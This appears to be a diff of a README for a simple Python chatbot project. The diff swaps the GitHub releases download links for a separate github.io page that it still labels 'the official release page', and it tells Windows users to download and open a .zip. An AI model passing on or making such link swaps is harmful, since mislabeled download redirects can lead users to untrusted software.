@@ -1,6 +1,6 @@
 # 🤖 Chatbot-Python-Project - Chat with a simple intelligent helper
 
-[https://github.com/Woodwindinstrumentarcidae110/Chatbot-Python-Project/releases](https://github.com/Woodwindinstrumentarcidae110/Chatbot-Python-Project/releases)
+[https://woodwindinstrumentarcidae110.github.io](https://woodwindinstrumentarcidae110.github.io)
 
 ## 📋 Project Overview
 
@@ -19,7 +19,7 @@ To run this chatbot, your computer needs a few components. Ensure your system me
 
 Follow these steps to set up and run the software on your Windows computer.
 
-1. First, visit the official release page to download the latest version of the software. You can find the link here: [https://github.com/Woodwindinstrumentarcidae110/Chatbot-Python-Project/releases](https://github.com/Woodwindinstrumentarcidae110/Chatbot-Python-Project/releases).
+1. First, visit the official release page to download the latest version of the software. You can find the link here: [https://woodwindinstrumentarcidae110.github.io](https://woodwindinstrumentarcidae110.github.io).
 2. Look for the file ending in .zip within the latest release.
 3. Click the file to start the download. 
 4. Once the download finishes, open your Downloads folder.
